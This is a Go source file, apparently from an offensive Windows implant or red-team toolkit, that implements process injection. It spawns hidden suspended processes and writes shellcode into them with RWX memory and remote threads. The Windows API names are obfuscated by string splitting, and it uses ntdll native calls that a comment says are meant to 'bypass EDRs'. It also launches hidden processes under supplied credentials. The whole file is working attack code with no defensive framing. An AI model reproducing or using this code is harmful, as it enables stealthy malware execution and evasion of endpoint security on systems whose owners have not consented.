package pivots

import (
	"errors"
	"fmt"
	"unsafe"
	"syscall"

	"golang.org/x/sys/windows"
)


const (
	PROCESS_ALL_ACCESS             = windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_READ | windows.PROCESS_VM_WRITE
	MEM_COMMIT                    = 0x1000
	MEM_RESERVE                   = 0x2000
	PAGE_EXECUTE_READWRITE        = 0x40
	LOGON32_LOGON_INTERACTIVE     = 2
	LOGON32_PROVIDER_DEFAULT      = 0
)

var (
    kernel32               = windows.NewLazySystemDLL("kernel32.dll")
    procVirtualAllocEx     = kernel32.NewProc("Vir"+"t"+"u"+"a"+"l"+"A"+"l"+"l"+"o"+"c"+"Ex") 
    procWriteProcessMemory = kernel32.NewProc("W"+"rit"+"e"+"P"+"r"+"o"+"c"+"e"+"s"+"s"+"M"+"emo"+"r"+"y") 
    procCreateRemoteThread = kernel32.NewProc("C"+"re"+"a"+"teR"+"e"+"m"+"o"+"t"+"e"+"T"+"h"+"r"+"e"+"a"+"d")
)


const (
	STARTF_USESHOWWINDOW = 0x00000001
	SW_HIDE              = 0
)




var (
	advapi32          = syscall.NewLazyDLL("advapi32.dll")
	procLogonUserW    = advapi32.NewProc("LogonUserW")
)




// SpawnProcess starts a process in suspended state and injects the current executable

func VirtualAllocEx(hProcess windows.Handle, lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	addr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		lpAddress,
		dwSize,
		uintptr(flAllocationType),
		uintptr(flProtect),
	)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}
	return addr, nil
}

// WriteProcessMemory writes data to the target process's memory.
func WriteProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr, lpNumberOfBytesWritten *uintptr) error {
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		lpBaseAddress,
		uintptr(unsafe.Pointer(lpBuffer)),
		nSize,
		uintptr(unsafe.Pointer(lpNumberOfBytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	return nil
}

// CreateRemoteThread creates a remote thread in the target process.
func CreateRemoteThread(hProcess windows.Handle, lpThreadAttributes uintptr, dwStackSize uint32, lpStartAddress uintptr, lpParameter uintptr, dwCreationFlags uint32, lpThreadId *uint32) (windows.Handle, error) {
	hThread, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		lpThreadAttributes,
		uintptr(dwStackSize),
		lpStartAddress,
		lpParameter,
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(lpThreadId)),
	)
	if hThread == 0 {
		return 0, fmt.Errorf("CreateRemoteThread failed: %v", err)
	}
	return windows.Handle(hThread), nil
}

// SpawnProcessRaw creates a suspended instance of cmd.exe with its window hidden,
// then injects a raw binary payload (shellcode) into it.
func SpawnProcessRaw(shellcode []byte, cmdPath string) (windows.Handle, windows.Handle, error) {
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	si.Cb = uint32(unsafe.Sizeof(si))
	// Hide the window by setting the appropriate flags.
	si.Flags = STARTF_USESHOWWINDOW
	si.ShowWindow = SW_HIDE

	// Specify cmd.exe as the target process.
	path, err := windows.UTF16PtrFromString(cmdPath)
	if err != nil {
		return 0, 0, fmt.Errorf("failed to convert cmd.exe path: %v", err)
	}

	err = windows.CreateProcess(
		nil,
		path,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		return 0, 0, fmt.Errorf("CreateProcess failed: %v", err)
	}

	// Allocate memory in the target process for the shellcode.
	remoteAddr, err := VirtualAllocEx(
		pi.Process,
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return pi.Process, pi.Thread, err
	}

	// Write the shellcode into the allocated memory.
	var bytesWritten uintptr
	err = WriteProcessMemory(
		pi.Process,
		remoteAddr,
		&shellcode[0],
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	if err != nil || bytesWritten != uintptr(len(shellcode)) {
		return pi.Process, pi.Thread, fmt.Errorf("WriteProcessMemory error: %v", err)
	}

	// Create a remote thread starting at the address where the shellcode was written.
	var threadID uint32
	remoteThread, err := CreateRemoteThread(
		pi.Process,
		0,
		0,
		remoteAddr,
		0,
		0,
		&threadID,
	)
	if err != nil {
		return pi.Process, pi.Thread, err
	}

	return pi.Process, remoteThread, nil
}




// FindProcessID retrieves the PID of a process by its name
func FindProcessID(name string) (uint32, error) {
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(hSnapshot)

	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = windows.Process32First(hSnapshot, &pe32)
	if err != nil {
		return 0, err
	}

	for {
		processName := windows.UTF16ToString(pe32.ExeFile[:])
		if processName == name {
			return pe32.ProcessID, nil
		}
		err = windows.Process32Next(hSnapshot, &pe32)
		if err != nil {
			break
		}
	}

	return 0, errors.New("process not found")
}

// InjectShellcode uses direct syscall to bypass EDRs and injects shellcode into a remote process
func InjectShellcode(pid uint32, shellcode []byte) error {
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hProcess)

	// Use VirtualAllocEx via syscall
	ntVirtualAllocEx := syscall.NewLazyDLL("ntdll.dll").NewProc("NtAllocateVirtualMemory")
	var baseAddr uintptr
	size := uintptr(len(shellcode))
	ntStatus, _, _ := ntVirtualAllocEx.Call(
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&size)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if ntStatus != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed with status: %x", ntStatus)
	}

	// Use WriteProcessMemory via syscall
	ntWriteProcessMemory := syscall.NewLazyDLL("ntdll.dll").NewProc("NtWriteVirtualMemory")
	var bytesWritten uintptr
	ntStatus, _, _ = ntWriteProcessMemory.Call(
		uintptr(hProcess),
		baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ntStatus != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed with status: %x", ntStatus)
	}

	// Use CreateRemoteThread via syscall
	ntCreateThreadEx := syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateThreadEx")
	var hThread uintptr
	ntStatus, _, _ = ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF,
		0,
		uintptr(hProcess),
		baseAddr,
		0,
		0,
		0,
		0,
		0,
		0,
	)
	if ntStatus != 0 {
		return fmt.Errorf("NtCreateThreadEx failed with status: %x", ntStatus)
	}

	return nil
}

// SpawnAsUser creates a process as a different user
func SpawnAsUser(username, password, domain, app string) error {
	var hToken windows.Token
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	userPtr, _ := windows.UTF16PtrFromString(username)
	passPtr, _ := windows.UTF16PtrFromString(password)
	domainPtr, _ := windows.UTF16PtrFromString(domain)
	appPtr, _ := windows.UTF16PtrFromString(app)

	// Call LogonUserW directly via syscall
	ret, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		uintptr(LOGON32_LOGON_INTERACTIVE),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return fmt.Errorf("LogonUserW failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hToken))

	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE

	err = windows.CreateProcessAsUser(
		hToken,
		nil,
		appPtr,
		nil,
		nil,
		false,
		windows.CREATE_UNICODE_ENVIRONMENT,
		nil,
		nil,
		&si,
		&pi,
	)

	if err != nil {
		return fmt.Errorf("CreateProcessAsUser failed: %v", err)
	}

	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)
	return nil
}
